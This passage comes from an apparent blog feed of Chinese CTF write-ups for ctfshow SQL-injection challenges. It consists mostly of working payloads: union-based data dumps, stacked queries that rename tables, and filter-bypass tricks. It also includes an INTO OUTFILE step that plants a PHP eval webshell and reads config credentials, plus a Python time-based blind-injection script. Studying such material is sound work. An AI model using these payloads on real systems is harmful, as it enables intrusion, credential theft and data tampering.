+</span><br></code></pre></td></tr></table></figure><p>这个SQL查询是在尝试向<code>users</code>表中插入一行数据。具体来说，它试图将<code>id</code>设置为<code>77</code>，<code>username</code>设置为从<code>ctfshow.flags</code>表中的<code>flag4s</code>列获取的所有值连接在一起（使用<code>group_concat</code>函数），<code>password</code>设置为<code>&quot;don77&quot;</code>。</p><p>但是直接插入数据，flag会写入字段里面数据库列长度不一定满足回显长度需求所以截取试试。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">77</span>,(<span class="hljs-keyword">select</span> SUBSTRING(group_concat(flag4s),<span class="hljs-number">1</span>,<span class="hljs-number">5</span>) <span class="hljs-keyword">from</span> ctfshow.flags),<span class="hljs-string">&quot;don77&quot;</span>)--+<br></code></pre></td></tr></table></figure><p>联合注入也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;闭合</span><br><span class="hljs-string">?id=0&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-559-堆叠注入-、id-1"><a href="#web-559-堆叠注入-、id-1" class="headerlink" title="web-559 堆叠注入 、id&#x3D;1"></a>web-559 堆叠注入 、id&#x3D;1</h2><p>堆叠注入</p><p>参考558</p><p>数字型</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> flags <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> ctfshow.flags;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> users <span class="hljs-keyword">to</span> a;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> flags <span class="hljs-keyword">to</span> users;<br><br>或:<br><br>?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-560-堆叠注入、id-1’"><a href="#web-560-堆叠注入、id-1’" class="headerlink" title="web-560 堆叠注入、id&#x3D;1’)"></a>web-560 堆叠注入、id&#x3D;1’)</h2><p>堆叠注入</p><p>参考558</p><p>‘)闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;);CREATE TABLE flags SELECT * <span class="hljs-keyword">FROM</span> ctfshow.flags;rename table<span class="hljs-built_in"> users </span><span class="hljs-keyword">to</span> a;rename table flags <span class="hljs-keyword">to</span><span class="hljs-built_in"> users;</span><br><span class="hljs-built_in"></span><br>或:<br><br>?<span class="hljs-attribute">id</span>=0&#x27;)union select 1,2,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags--+<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sql注入</title>
      <link href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="web-171（无过滤字符型注入）"><a href="#web-171（无过滤字符型注入）" class="headerlink" title="web-171（无过滤字符型注入）"></a>web-171（无过滤字符型注入）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>无过滤的字符型注入</strong></p><p>payload步骤：</p><figure class="highlight flix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs flix"><span class="hljs-number">1</span> or <span class="hljs-number">1</span>=<span class="hljs-number">2</span> --+<span class="hljs-comment">//正常回显id为1的用户，排除数字型，判断为字符型</span><br><br><span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+<span class="hljs-comment">//使用注释符得到flag</span><br>或者<br><span class="hljs-number">1</span>&#x27; or <span class="hljs-string">&#x27;1&#x27;</span> = &#x27;<span class="hljs-number">1</span><span class="hljs-comment">//手工闭合得到flag</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-172（无过滤字符型注入、union联合查询）"><a href="#web-172（无过滤字符型注入、union联合查询）" class="headerlink" title="web-172（无过滤字符型注入、union联合查询）"></a>web-172（无过滤字符型注入、union联合查询）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>检查结果是否有flag<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>-&gt;username!==<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;  <br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>添加限制条件 name!&#x3D;‘flag’ 输出的username中不能有flag</strong></p><p><strong>所以只能用union联合查询了，走流程</strong></p><p><strong>爆库名-&gt;爆表名-&gt;爆列名-&gt;爆字段值</strong></p><p>payload构造步骤：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-comment">//判断是字符型注入</span><br><span class="hljs-number">1</span> <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> --+<br><span class="hljs-comment">//判断为单引号闭合</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+ <br><span class="hljs-comment">//测出此表有2列</span><br><span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> --+<br><span class="hljs-comment">//爆出库名为ctfshow_web</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() --+<br><span class="hljs-comment">//爆出两表名ctfshow_user,ctfshow_user2</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema = &#x27;ctfshow_web&#x27; --+<br><span class="hljs-comment">//爆出列名id,username,password</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name = &#x27;ctfshow_user2&#x27; --+<br><span class="hljs-comment">//根据列名爆出数据得到flag</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,&#x27;-&#x27;,password) <span class="hljs-keyword">from</span> ctfshow_user2  --+<span class="hljs-comment">//爆出全部数据</span><br>或者直接筛选flag<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,&#x27;-&#x27;,password) <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-built_in">where</span> username = &#x27;flag&#x27; --+<br></code></pre></td></tr></table></figure><hr><h2 id="web-173（字符型注入、hex函数绕过正则过滤flag）"><a href="#web-173（字符型注入、hex函数绕过正则过滤flag）" class="headerlink" title="web-173（字符型注入、hex函数绕过正则过滤flag）"></a>web-173（字符型注入、hex函数绕过正则过滤flag）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>检查结果是否有flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>返回数据会检查是否有username&#x3D;’flag’，但是我们不查username字段就行了，或者将username字段使用hex函数编码</strong></p><p><strong>还有一种方法就是将flag替换</strong></p><p>payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">前面同样的步骤，这里不写了，区别在于这里有3列，并且flag所在表名为ctfshow_user3，直接不带username字段联合查询<br>-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> --+<br><br>或者<br>因为字段中不允许出现flag  所以直接把字段改成hex()格式 ，这样就避开 了，<br>于是出现的一行中，显示为<span class="hljs-number">666</span>C6167 这正是’flag<span class="hljs-string">&#x27;这hex() 格式，  后面的flag 正是</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,hex(username),<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> --+<br><br>或者<br>替换<span class="hljs-string">&quot;flag&quot;</span>，满足检测，这里把flag中的f换成g就能满足检测了<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select id,replace(username,&#x27;</span>f<span class="hljs-string">&#x27;,&#x27;</span>g<span class="hljs-string">&#x27;),password from ctfshow_user3 where username = &#x27;</span>flag<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-174（正则过滤数字、replace函数绕过、盲注）"><a href="#web-174（正则过滤数字、replace函数绕过、盲注）" class="headerlink" title="web-174（正则过滤数字、replace函数绕过、盲注）"></a>web-174（正则过滤数字、replace函数绕过、盲注）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user4 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>检查结果是否有flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>发现过滤了flag与数字，我们可以利用mysql的replace替换数字、或者使用盲注脚本（不知道为什么我这里失败了）</p><p>payload：</p><p>replace函数绕过做法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">前面判断闭合类型和列数就不写了，单引号闭合，两列<br>//爆库名，因为数字被过滤了，这里用<span class="hljs-string">&#x27;a&#x27;</span>来绕过，并且从这里开始要使用replace函数替换掉数字了<br>爆出库名为ctfshow_web<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(database(),&#x27;</span><span class="hljs-number">9</span><span class="hljs-string">&#x27;,&#x27;</span>nin<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">8</span><span class="hljs-string">&#x27;,&#x27;</span>eight<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">7</span><span class="hljs-string">&#x27;,&#x27;</span>seven<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">6</span><span class="hljs-string">&#x27;,&#x27;</span>six<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">5</span><span class="hljs-string">&#x27;,&#x27;</span>fiv<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;,&#x27;</span>four<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;,&#x27;</span>thre<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span>two<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">on</span><span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;,&#x27;</span>zero<span class="hljs-string">&#x27;) --+</span><br><span class="hljs-string">//爆表名，查出表名为ctfshow_userfour，即ctfshow_user4</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;a&#x27;</span>,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;nine&#x27;</span>),<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;eight&#x27;</span>),<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;seven&#x27;</span>),<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;six&#x27;</span>),<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;five&#x27;</span>),<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;four&#x27;</span>),<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;three&#x27;</span>),<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;two&#x27;</span>),<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;one&#x27;</span>),<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;zero&#x27;</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;ctfshow_web&#x27;</span> <span class="hljs-comment">--+</span><br>//爆列名，查出列名为id,username,<span class="hljs-keyword">password</span><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(group_concat(column_name),&#x27;</span><span class="hljs-number">9</span><span class="hljs-string">&#x27;,&#x27;</span>nin<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">8</span><span class="hljs-string">&#x27;,&#x27;</span>eight<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">7</span><span class="hljs-string">&#x27;,&#x27;</span>seven<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">6</span><span class="hljs-string">&#x27;,&#x27;</span>six<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">5</span><span class="hljs-string">&#x27;,&#x27;</span>fiv<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;,&#x27;</span>four<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;,&#x27;</span>thre<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span>two<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">on</span><span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;,&#x27;</span>zero<span class="hljs-string">&#x27;) from information_schema.columns where table_name = &#x27;</span>ctfshow_user4<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">//爆数据，这里把flag中的f替换为G来绕过，得到flag。</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> REPLACE(username,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>), REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(<span class="hljs-keyword">password</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;nine&#x27;</span>),<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;eight&#x27;</span>),<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;seven&#x27;</span>),<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;six&#x27;</span>),<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;five&#x27;</span>),<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;four&#x27;</span>),<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;three&#x27;</span>),<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;two&#x27;</span>),<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;one&#x27;</span>),<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;zero&#x27;</span>) <span class="hljs-keyword">from</span> ctfshow_user4 <span class="hljs-comment">--+</span><br><br>得到flag为ctfshow&#123;eightdsixabtwodb-onezerothreefive-fourbdd-bddtwo-zerodabbbbdonezeroeightc&#125;<br>我们最后还要根据替换的字符解码<br></code></pre></td></tr></table></figure><hr><h2 id="web-175（正则过滤ascii-0-127绕过、利用into-outfile写入webshell、时间盲注-）"><a href="#web-175（正则过滤ascii-0-127绕过、利用into-outfile写入webshell、时间盲注-）" class="headerlink" title="web-175（正则过滤ascii 0-127绕过、利用into outfile写入webshell、时间盲注 ）"></a>web-175（正则过滤ascii 0-127绕过、利用into outfile写入webshell、时间盲注 ）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user5 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>检查结果是否有flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br>      <br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>过滤了 ascii 0-127，尝试从其他信道将数据带出，利用into outfile来实现文件的输出</strong></p><p><strong>还可以使用时间盲注，因为没有回显所以布尔盲注不行</strong></p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27; into outfile &#x27;</span>/<span class="hljs-keyword">var</span>/www/html/mixbp.php<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">然后使用蚁剑连接</span><br><span class="hljs-string">http://c3041e53-3cc6-410a-9f33-e55e57ee7b6b.challenge.ctf.show/mixbp.php密码为1</span><br><span class="hljs-string">这样我们就可以修改正则了。然后再次注入即可。</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">或者post传参1=system(&quot;tac ./api/config.php&quot;);得到数据库密码，然后连接数据库，使用select语句查找flag</span><br></code></pre></td></tr></table></figure><p>时间盲注脚本：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import <span class="hljs-built_in">time</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    url = <span class="hljs-string">&#x27;http://2a8873c8-47c9-4783-b056-ef2c97bdb9cb.challenge.ctf.show/api/?id=&#x27;</span><br>    <span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            payload = f<span class="hljs-string">&#x27;1\&#x27; and if(ascii(substr((select group_concat(database()) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            stime=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>            r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()-stime&lt;<span class="hljs-number">1</span>:<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            <span class="hljs-built_in">result</span> += chr(low)<br>        <span class="hljs-keyword">else</span>:<br>            break<br>        print(<span class="hljs-built_in">result</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="web-176（大小写绕过select过滤）"><a href="#web-176（大小写绕过select过滤）" class="headerlink" title="web-176（大小写绕过select过滤）"></a>web-176（大小写绕过select过滤）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span 